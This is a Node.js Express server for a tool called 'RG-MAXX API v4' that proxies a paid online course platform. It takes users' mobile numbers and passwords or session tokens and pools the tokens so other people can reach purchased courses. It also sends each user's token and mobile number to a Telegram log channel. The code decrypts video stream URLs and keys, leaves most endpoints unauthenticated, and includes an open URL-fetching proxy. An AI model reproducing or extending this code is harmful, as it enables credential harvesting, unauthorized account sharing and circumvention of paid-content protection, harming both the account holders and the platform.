// server.js — RG-MAXX API v4
// ✅ ID+Password login support
// ✅ Duplicate batches fix — refresh pe add nahi hota, replace hota hai
// ✅ Single batch fetch — ek baar hi, baarbaar request nahi
// ✅ Telegram log mein userId + token clearly
// ✅ /disconnect command — Telegram tokens remove
// ✅ Premium dark UI

import "dotenv/config";
import express from "express";
import fetch from "node-fetch";
import { BASE_URL, BASE_HEADERS, makeHeaders, decrypt } from "./lib/config.js";
import {
  addToken, removeToken, getAllTokens,
  getTokenCount, getToken, getAnyToken,
  getTokenForBatch, clearPool, updateBatches,
} from "./lib/tokenStore.js";
import { smartFetch } from "./lib/smartFetch.js";
import { fetchUserBatches, loginWithCredentials, extractUserIdFromToken } from "./lib/fetchBatches.js";
import {
  sendLog, buildLoginLog,
  processTelegramUpdate, setWebhook,
} from "./lib/telegram.js";
import { MANUAL_USERS } from "./users.js";

const app = express();
app.use(express.json());

// ── CORS ─────────────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ══════════════════════════════════════════════════════════════════════════════
// BOOT — users.js se tokens load karo (single fetch per user)
// ══════════════════════════════════════════════════════════════════════════════
async function loadManualUsers() {
  console.log(`\n📋 users.js se ${MANUAL_USERS.length} users load ho rahe hain...`);
  let loaded = 0;
  for (const u of MANUAL_USERS) {
    if (!u.userId || !u.token) continue;
    if (u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO")) {
      console.log(`  ⚠️  ${u.name || u.userId} — placeholder, skip`);
      continue;
    }
    try {
      const batches = await fetchUserBatches(u.userId, u.token);
      addToken(u.userId, u.token, u.name || "", batches, "manual");
      console.log(`  ✅ ${u.name || u.userId} — ${batches.length} batches`);
      loaded++;
    } catch (err) {
      console.log(`  ❌ ${u.userId} — ${err.message}`);
    }
  }
  console.log(`✅ ${loaded}/${MANUAL_USERS.length} users loaded\n`);
}

// ══════════════════════════════════════════════════════════════════════════════
// HOME — PREMIUM DARK UI
// ══════════════════════════════════════════════════════════════════════════════
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RG-MAXX API v4</title>
<style>
  :root {
    --bg: #080b14;
    --surface: #0e1420;
    --border: #1e2a40;
    --accent: #6c63ff;
    --accent2: #00d4ff;
    --green: #00e676;
    --red: #ff5252;
    --yellow: #ffd740;
    --text: #e2e8f0;
    --muted: #64748b;
    --card: #111827;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
  }

  /* ── NAV ── */
  .nav {
    background: rgba(14,20,32,0.95);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
    padding: 14px 32px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .nav-brand {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 1.2rem;
    font-weight: 700;
    color: var(--text);
  }
  .nav-brand span {
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  .nav-badge {
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff;
    font-size: .65rem;
    padding: 2px 8px;
    border-radius: 20px;
    font-weight: 700;
    letter-spacing: .5px;
  }
  .status-pill {
    display: flex;
    align-items: center;
    gap: 8px;
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 6px 14px;
    border-radius: 20px;
    font-size: .82rem;
  }
  .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); animation: pulse 2s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

  /* ── HERO ── */
  .hero {
    padding: 60px 32px 40px;
    text-align: center;
    background: radial-gradient(ellipse at 50% 0, rgba(108,99,255,.12) 0, transparent 70%);
  }
  .hero h1 {
    font-size: 2.8rem;
    font-weight: 800;
    background: linear-gradient(135deg, #fff 30%, var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 10px;
  }
  .hero p { color: var(--muted); font-size: 1rem; max-width: 500px; margin: 0 auto 30px; }

  /* ── STATS ROW ── */
  .stats {
    display: flex;
    gap: 16px;
    justify-content: center;
    flex-wrap: wrap;
    padding: 0 32px 40px;
  }
  .stat-card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 16px 24px;
    min-width: 140px;
    text-align: center;
  }
  .stat-val {
    font-size: 1.8rem;
    font-weight: 800;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  .stat-lbl { font-size: .75rem; color: var(--muted); margin-top: 4px; }

  /* ── MAIN LAYOUT ── */
  .main { max-width: 1100px; margin: 0 auto; padding: 0 32px 60px; }

  /* ── SECTION HEADING ── */
  .section-title {
    font-size: .7rem;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--accent);
    margin: 36px 0 14px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .section-title::after {
    content: '';
    flex: 1;
    height: 1px;
    background: var(--border);
  }

  /* ── CARDS ── */
  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 16px 20px;
    margin-bottom: 10px;
    transition: border-color .2s, transform .2s;
  }
  .card:hover { border-color: var(--accent); transform: translateY(-1px); }
  .card-top { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
  .method {
    display: inline-block;
    padding: 3px 10px;
    border-radius: 6px;
    font-size: .7rem;
    font-weight: 800;
    letter-spacing: .5px;
    flex-shrink: 0;
  }
  .GET { background: rgba(0,212,255,.12); color: var(--accent2); border: 1px solid rgba(0,212,255,.25); }
  .POST { background: rgba(0,230,118,.1); color: var(--green); border: 1px solid rgba(0,230,118,.25); }
  code {
    background: rgba(108,99,255,.12);
    color: #a78bfa;
    padding: 3px 8px;
    border-radius: 5px;
    font-size: .82rem;
    font-family: 'Consolas', monospace;
    word-break: break-all;
  }
  .card-desc { color: var(--muted); font-size: .82rem; margin-top: 6px; line-height: 1.5; }
  .card-params { font-size: .78rem; color: #fbbf24; margin-top: 5px; }
  .new-badge {
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff;
    font-size: .65rem;
    padding: 2px 8px;
    border-radius: 10px;
    font-weight: 700;
  }

  /* ── HIGHLIGHT BOX ── */
  .highlight {
    background: linear-gradient(135deg, rgba(108,99,255,.08), rgba(0,212,255,.06));
    border: 1px solid rgba(108,99,255,.3);
    border-radius: 14px;
    padding: 20px 24px;
    margin-bottom: 24px;
  }
  .highlight h3 { color: var(--accent2); font-size: .9rem; margin-bottom: 10px; }
  pre {
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 12px 16px;
    font-size: .78rem;
    overflow-x: auto;
    color: #94a3b8;
    font-family: 'Consolas', monospace;
    margin-top: 10px;
  }

  /* ── FLOW BOX ── */
  .flow {
    background: rgba(0,230,118,.04);
    border: 1px solid rgba(0,230,118,.2);
    border-radius: 12px;
    padding: 18px 22px;
    font-size: .86rem;
    line-height: 1.9;
    margin-bottom: 20px;
  }
  .flow b { color: var(--green); }

  /* ── FOOTER ── */
  footer {
    text-align: center;
    padding: 32px;
    color: var(--muted);
    font-size: .78rem;
    border-top: 1px solid var(--border);
    margin-top: 20px;
  }

  @media(max-width:600px) {
    .nav { padding: 12px 16px; }
    .hero { padding: 40px 16px 24px; }
    .hero h1 { font-size: 2rem; }
    .main { padding: 0 16px 40px; }
    .stats { padding: 0 16px 24px; }
  }
</style>
</head>
<body>

<!-- NAV -->
<nav class="nav">
  <div class="nav-brand">
    ⚡ <span>RG-MAXX API</span>
    <span class="nav-badge">v4</span>
  </div>
  <div class="status-pill">
    <div class="dot"></div>
    Online &nbsp;|&nbsp; Tokens:&nbsp;<strong id="tc">...</strong>
  </div>
</nav>

<!-- HERO -->
<section class="hero">
  <h1>RG-MAXX API v4</h1>
  <p>RG Vikramjeet Course Proxy — ID/Password Login · Token Pool · Telegram Bot</p>
</section>

<!-- STATS -->
<div class="stats" id="stats-row">
  <div class="stat-card">
    <div class="stat-val" id="s-total">—</div>
    <div class="stat-lbl">Total Tokens</div>
  </div>
  <div class="stat-card">
    <div class="stat-val" id="s-manual">—</div>
    <div class="stat-lbl">Manual Users</div>
  </div>
  <div class="stat-card">
    <div class="stat-val" id="s-dynamic">—</div>
    <div class="stat-lbl">Dynamic Users</div>
  </div>
  <div class="stat-card">
    <div class="stat-val" id="s-bot">—</div>
    <div class="stat-lbl">Telegram Bot</div>
  </div>
</div>

<div class="main">

  <!-- FLOW -->
  <div class="flow">
    <b>🔄 How it works (v4):</b><br>
    <b>Path 1 — ID+Password:</b> <code>POST /api/login</code> mein <code>{ mobile, password }</code> bhejo → Auto login + batches fetch ✅<br>
    <b>Path 2 — Token Direct:</b> <code>POST /api/login</code> mein <code>{ userId, token }</code> bhejo ✅<br>
    <b>Path 3 — users.js:</b> File mein hardcode karo → Server start pe auto-load ✅<br>
    <b>Path 4 — Telegram Bot:</b> <code>/login mobile pass</code> ya <code>/add userId token</code> ✅<br>
    <b>Disconnect:</b> Bot mein <code>/disconnect</code> → Telegram tokens auto-remove 🔌
  </div>

  <!-- NEW v4 -->
  <div class="highlight">
    <h3>🆕 v4 — ID+Password Login Support</h3>
    <div style="font-size:.84rem;color:#94a3b8">Website ya Telegram bot se mobile number aur password se directly login karo — token manually dhundhne ki zaroorat nahi!</div>
    <pre>// Website se
POST /api/login
{ "mobile": "9876543210", "password": "yourpass" }

// Token se (pehle jaisa)
POST /api/login
{ "userId": "123456", "token": "eyJ..." }

// Telegram Bot se
/login 9876543210 yourpassword
/add 123456 eyJ0eXAi...</pre>
  </div>

  <!-- AUTH -->
  <div class="section-title">🔐 Authentication</div>

  <div class="card">
    <div class="card-top">
      <span class="method POST">POST</span>
      <code>/api/login</code>
      <span class="new-badge">UPDATED v4</span>
    </div>
    <div class="card-desc">ID+Password ya Token se login karo. Auto-fetches batches (ek baar hi), adds to pool, Telegram pe log karta hai.</div>
    <pre>// Option A — ID+Password
{ "mobile": "9876543210", "password": "yourpassword" }

// Option B — Direct Token
{ "userId": "123456", "token": "eyJ..." }

// Response
{ "success": true, "userId": "123456", "batchCount": 3, "batches": [...] }</pre>
  </div>

  <div class="card">
    <div class="card-top">
      <span class="method GET">GET</span>
      <code>/api/add-token?userid=123&token=eyJ...</code>
    </div>
    <div class="card-desc">URL se manually token add karo.</div>
  </div>

  <div class="card">
    <div class="card-top">
      <span class="method POST">POST</span>
      <code>/api/bulk-login</code>
    </div>
    <div class="card-desc">Ek saath kai tokens: <code>[{userId, token}, ...]</code></div>
  </div>

  <!-- USERS -->
  <div class="section-title">👥 Users Management</div>

  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/users</code></div>
    <div class="card-desc">Sab users list karo (manual + dynamic) with source info</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/reload-users</code></div>
    <div class="card-desc">users.js se dobara reload (bina restart ke)</div>
    <div class="card-params">Query: secret=ADMIN_SECRET</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/remove-token?userid=123</code></div>
    <div class="card-desc">Ek user ka token pool se hatao</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/pool</code></div>
    <div class="card-desc">Pura pool detail dekho</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/clear-pool?secret=...</code></div>
    <div class="card-desc">Pura pool clear karo</div>
  </div>

  <!-- BATCHES -->
  <div class="section-title">📚 Batches / Courses</div>

  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/all-batches</code></div>
    <div class="card-desc">Sab tokens ke sab unique courses combined (no duplicates)</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/my-courses?userid=123</code></div>
    <div class="card-desc">Specific user ke courses</div>
  </div>

  <!-- CONTENT -->
  <div class="section-title">📖 Course Content</div>

  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/subjects?courseid=257</code></div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/topics?courseid=257&subjectid=1</code></div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/concepts?courseid=257&subjectid=1&topicid=1</code></div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/videos?courseid=257&subjectid=1&topicid=1&conceptid=1</code></div>
    <div class="card-desc">Video/PDF list for a concept</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/video-details?course_id=257&video_id=12345</code></div>
    <div class="card-desc">Decrypted stream URLs for a video</div>
  </div>

  <!-- TESTS -->
  <div class="section-title">🧪 Tests</div>

  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/tests?testseriesid=100&subject_id=1</code></div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/questions?url=https://...</code></div>
    <div class="card-desc">Questions JSON proxy</div>
  </div>

  <!-- TELEGRAM -->
  <div class="section-title">🤖 Telegram Bot</div>

  <div class="highlight">
    <h3>Bot Commands</h3>
    <pre>/start              — Help dekho
/login MOBILE PASS  — ID+Password se login
/add USER_ID TOKEN  — Token se add
/remove USER_ID     — Token hatao
/disconnect         — Telegram tokens saare hatao
/status             — Pool status</pre>
  </div>

  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/set-webhook</code></div>
    <div class="card-desc">One-time: Telegram webhook register karo (deploy ke baad ek baar)</div>
  </div>
  <div class="card">
    <div class="card-top"><span class="method POST">POST</span><code>/api/telegram-webhook</code></div>
    <div class="card-desc">Telegram ke liye auto webhook (manually mat call karo)</div>
  </div>

  <!-- STATUS -->
  <div class="section-title">📊 Status</div>
  <div class="card">
    <div class="card-top"><span class="method GET">GET</span><code>/api/status</code></div>
    <div class="card-desc">Server health + token count</div>
  </div>

</div>

<footer>RG-MAXX API v4 &nbsp;•&nbsp; Built for RG Vikramjeet Platform</footer>

<script>
fetch('/api/status').then(r=>r.json()).then(d=>{
  document.getElementById('tc').textContent = d.tokens;
  document.getElementById('s-total').textContent = d.tokens;
}).catch(()=>{});

fetch('/api/users').then(r=>r.json()).then(d=>{
  document.getElementById('s-manual').textContent = d.manual || 0;
  document.getElementById('s-dynamic').textContent = d.dynamic || 0;
}).catch(()=>{});

fetch('/api/status').then(r=>r.json()).then(d=>{
  document.getElementById('s-bot').textContent = d.telegram_bot ? '✅' : '❌';
}).catch(()=>{});
</script>
</body>
</html>`);
});

// ══════════════════════════════════════════════════════════════════════════════
// STATUS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/status", (req, res) => {
  res.json({
    status: "RG-MAXX API v4 Online",
    version: "v4",
    tokens: getTokenCount(),
    manual_users_defined: MANUAL_USERS.filter(
      (u) => u.token && !u.token.startsWith("TOKEN_")
    ).length,
    telegram_bot: !!process.env.TELEGRAM_BOT_TOKEN,
    telegram_channel: !!process.env.TELEGRAM_LOG_CHANNEL_ID,
  });
});

// ══════════════════════════════════════════════════════════════════════════════
// ALL USERS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/users", (req, res) => {
  const users = getAllTokens().map((t) => ({
    userId: t.userId,
    name: t.name || "",
    source: t.source || "unknown",
    batchCount: t.batches.length,
    batches: t.batches.map((b) => ({ id: b.id, name: b.name, expiry: b.expiry || "" })),
    addedAt: t.addedAt,
    updatedAt: t.updatedAt,
    tokenPreview: t.token.substring(0, 20) + "...",
  }));
  res.json({
    total: users.length,
    manual: users.filter((u) => u.source === "manual").length,
    dynamic: users.filter((u) => u.source !== "manual").length,
    users,
  });
});

// ══════════════════════════════════════════════════════════════════════════════
// RELOAD USERS.JS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/reload-users", async (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden: wrong secret" });
  }

  let loaded = 0, skipped = 0;
  const results = [];

  for (const u of MANUAL_USERS) {
    if (!u.userId || !u.token) { skipped++; continue; }
    if (u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO")) {
      skipped++;
      results.push({ userId: u.userId, name: u.name, status: "placeholder_skipped" });
      continue;
    }
    try {
      const batches = await fetchUserBatches(u.userId, u.token);
      addToken(u.userId, u.token, u.name || "", batches, "manual");
      loaded++;
      results.push({ userId: u.userId, name: u.name, status: "loaded", batchCount: batches.length });
    } catch (err) {
      skipped++;
      results.push({ userId: u.userId, name: u.name, status: "error", error: err.message });
    }
  }

  res.json({ success: true, loaded, skipped, totalInPool: getTokenCount(), results });
});

// ══════════════════════════════════════════════════════════════════════════════
// LOGIN — v4: ID+Password OR userId+token support
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/login", async (req, res) => {
  try {
    const { userId, token, mobile, password } = req.body || {};

    let finalUserId, finalToken;

    // Option A: ID + Password
    if (mobile && password) {
      try {
        const result = await loginWithCredentials(mobile, password);
        finalUserId = result.userId;
        finalToken = result.token;
      } catch (e) {
        return res.status(401).json({ success: false, error: `Login failed: ${e.message}` });
      }
    }
    // Option B: userId + token (direct)
    else if (userId && token) {
      finalUserId = String(userId);
      finalToken = String(token);
    }
    else {
      return res.status(400).json({
        success: false,
        error: "Send { mobile, password } for ID+Pass login, OR { userId, token } for direct token",
      });
    }

    // Fetch batches once
    const batches = await fetchUserBatches(finalUserId, finalToken);
    addToken(finalUserId, finalToken, "", batches, "login");

    const source = (mobile && password) ? "id_pass" : "website";
    const extra = (mobile && password) ? mobile : "";
    await sendLog(buildLoginLog(finalUserId, finalToken, batches, source, extra));

    res.json({
      success: true,
      userId: finalUserId,
      batchCount: batches.length,
      batches,
      message: "Token added to pool. Content is now accessible.",
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// ADD TOKEN (GET method)
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/add-token", async (req, res) => {
  try {
    const { userid, token, name } = req.query;
    if (!userid || !token) {
      return res.status(400).json({ success: false, error: "userid and token required" });
    }

    const batches = await fetchUserBatches(userid, token);
    addToken(userid, token, name || "", batches, "api");
    await sendLog(buildLoginLog(userid, token, batches, "website"));

    res.json({ success: true, userId: userid, batchCount: batches.length, batches });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// BULK LOGIN
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/bulk-login", async (req, res) => {
  try {
    const users = Array.isArray(req.body) ? req.body : [];
    if (users.length === 0) {
      return res.status(400).json({ error: "Send array: [{userId, token}, ...]" });
    }

    let added = 0;
    for (const u of users) {
      if (!u.userId || !u.token) continue;
      addToken(u.userId, u.token, u.name || "", [], "bulk");
      added++;
    }

    res.json({
      success: true,
      added,
      total: getTokenCount(),
      note: "Batches not pre-fetched in bulk mode. They will be fetched on demand.",
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// REMOVE TOKEN
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/remove-token", (req, res) => {
  const { userid } = req.query;
  if (!userid) return res.status(400).json({ error: "userid required" });
  const removed = removeToken(userid);
  res.json({ success: removed, userId: userid });
});

// ══════════════════════════════════════════════════════════════════════════════
// POOL INFO
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/pool", (req, res) => {
  const users = getAllTokens().map((t) => ({
    userId: t.userId,
    name: t.name || "",
    source: t.source || "unknown",
    batchCount: t.batches.length,
    batchNames: t.batches.map((b) => `[${b.id}] ${b.name}`),
    addedAt: t.addedAt,
    updatedAt: t.updatedAt,
    tokenPreview: t.token.substring(0, 25) + "...",
  }));
  res.json({ total: users.length, users });
});

// ══════════════════════════════════════════════════════════════════════════════
// CLEAR POOL
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/clear-pool", (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden: wrong secret" });
  }
  const count = clearPool();
  res.json({ success: true, cleared: count });
});

// ══════════════════════════════════════════════════════════════════════════════
// ALL BATCHES — combined, no duplicates
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/all-batches", async (req, res) => {
  try {
    const tokens = getAllTokens();
    if (tokens.length === 0) {
      return res.json({ status: 200, total: 0, data: [], message: "No tokens in pool" });
    }

    const batchMap = new Map(); // id => batch (auto-dedup across all users)

    await Promise.allSettled(
      tokens.map(async (entry) => {
        try {
          const headers = makeHeaders(entry.token, entry.userId);
          const resp = await fetch(
            `${BASE_URL}/get/get_all_purchases?userid=${entry.userId}`,
            { headers, timeout: 10000 }
          );
          if (!resp.ok) return;
          const data = await resp.json();
          for (const item of data.data || []) {
            if (item.itemtype === "Course" && item.coursedt?.[0]) {
              const c = item.coursedt[0];
              const id = String(c.id);
              if (!batchMap.has(id)) {
                batchMap.set(id, {
                  id,
                  name: c.course_name,
                  thumbnail: c.course_thumbnail,
                  expiry: item.enddatetime,
                });
              }
            }
          }
        } catch (_) {}
      })
    );

    const masterList = Array.from(batchMap.values());
    res.json({ status: 200, total: masterList.length, data: masterList });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// MY COURSES
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/my-courses", async (req, res) => {
  try {
    const { userid } = req.query;
    const entry = userid ? getToken(userid) : getAnyToken();
    if (!entry) return res.status(503).json({ error: "No token found" });

    const headers = makeHeaders(entry.token, entry.userId);
    const resp = await fetch(`${BASE_URL}/get/mycourseweb?userid=${entry.userId}`, { headers });
    const data = await resp.json();

    const courses = (data.data || []).map((c) => ({
      id: c.id,
      name: c.course_name,
      thumbnail: c.course_thumbnail,
      expiry: c.expiryDate,
      is_paid: c.is_paid,
    }));

    res.json({ total: courses.length, courses });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// SUBJECTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/subjects", async (req, res) => {
  try {
    const { courseid } = req.query;
    if (!courseid) return res.status(400).json({ error: "courseid required" });

    const result = await smartFetch(
      "/get/allsubjectfrmlivecourseclass",
      { courseid, start: "-1" },
      false, courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const subjects = (result.data || []).map((s) => ({
      id: s.subjectid,
      name: s.subject_name,
    }));
    res.json({ total: subjects.length, subjects });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TOPICS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/topics", async (req, res) => {
  try {
    const { courseid, subjectid } = req.query;
    if (!courseid || !subjectid) return res.status(400).json({ error: "courseid and subjectid required" });

    const result = await smartFetch(
      "/get/alltopicfrmlivecourseclass",
      { courseid, subjectid, start: "-1" },
      false, courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const topics = (result.data || []).map((t) => ({
      id: t.topicid,
      name: t.topic_name,
    }));
    res.json({ total: topics.length, topics });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// CONCEPTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/concepts", async (req, res) => {
  try {
    const { courseid, subjectid, topicid } = req.query;
    if (!courseid || !subjectid || !topicid) {
      return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    }

    const result = await smartFetch(
      "/get/allconceptfrmlivecourseclass",
      { courseid, subjectid, topicid, start: "-1" },
      false, courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const concepts = (result.data || []).map((c) => ({
      id: c.conceptid,
      name: c.concept_name,
    }));
    res.json({ total: concepts.length, concepts });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// VIDEOS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/videos", async (req, res) => {
  try {
    const { courseid, subjectid, topicid, conceptid } = req.query;
    if (!courseid || !subjectid || !topicid) {
      return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    }

    const result = await smartFetch(
      "/get/livecourseclassbycoursesubtopconceptapiv3",
      { courseid, subjectid, topicid, conceptid: conceptid || "1", start: "0" },
      false, courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const content = (result.data || []).map((i) => ({
      id: i.id,
      title: i.Title,
      type: i.material_type,
      pdf_url: decrypt(i.pdf_link),
      player_url: i.video_player_url ? i.video_player_url + i.video_player_token : null,
      video_id: i.video_id || null,
      duration: i.video_duration || null,
    }));
    res.json({ total: content.length, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// VIDEO DETAILS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/video-details", async (req, res) => {
  try {
    const { course_id, video_id } = req.query;
    if (!video_id) return res.status(400).json({ error: "video_id required" });

    const result = await smartFetch(
      "/get/fetchVideoDetailsById",
      { course_id: course_id || "257", video_id, ytflag: "0", folder_wise_course: "0", lc_app_api_url: "" },
      true, course_id
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const data = result.data || {};
    const streams = (data.encrypted_links || []).map((q) => ({
      quality: q.quality,
      url: decrypt(q.path),
      key: decrypt(q.key),
    }));

    res.json({
      video_id,
      title: data.title || "",
      duration: data.video_duration || "",
      streams,
      player_url: data.video_player_url
        ? data.video_player_url + (data.video_player_token || "")
        : null,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TESTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/tests", async (req, res) => {
  try {
    const { testseriesid, subject_id } = req.query;
    if (!testseriesid) return res.status(400).json({ error: "testseriesid required" });

    const entry = getAnyToken();
    if (!entry) return res.status(503).json({ error: "No tokens in pool" });

    const headers = makeHeaders(entry.token, entry.userId);
    const url = `${BASE_URL}/get/test_titlev2?testseriesid=${testseriesid}&subject_id=${subject_id || ""}&userid=${entry.userId}&start=-1`;
    const resp = await fetch(url, { headers });
    const j = await resp.json();

    const tests = (j.test_titles || []).map((t) => ({
      id: t.id,
      title: t.title,
      questions_url: t.test_questions_url,
    }));
    res.json({ total: tests.length, tests });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// QUESTIONS PROXY
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/questions", async (req, res) => {
  try {
    const { url } = req.query;
    if (!url) return res.status(400).json({ error: "url required" });
    const resp = await fetch(url);
    const j = await resp.json();
    res.json(j);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/telegram-webhook", async (req, res) => {
  try {
    res.sendStatus(200);
    await processTelegramUpdate(req.body);
  } catch (err) {
    console.error("[Webhook] Error:", err.message);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// SET WEBHOOK
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/set-webhook", async (req, res) => {
  try {
    const host = req.headers.host;
    const protocol = host.includes("localhost") ? "http" : "https";
    const webhookUrl = `${protocol}://${host}/api/telegram-webhook`;
    const result = await setWebhook(webhookUrl);
    res.json({ webhookUrl, telegramResponse: result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// 404
// ══════════════════════════════════════════════════════════════════════════════
app.use((req, res) => {
  res.status(404).json({ error: "Not found. Visit / for API docs." });
});

// ══════════════════════════════════════════════════════════════════════════════
// START
// ══════════════════════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 3000;

loadManualUsers().then(() => {
  app.listen(PORT, () => {
    console.log(`✅ RG-MAXX API v4 on port ${PORT}`);
    console.log(`📖 Docs: http://localhost:${PORT}/`);
    console.log(`🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? "configured" : "NOT configured"}`);
  });
});

export default app;
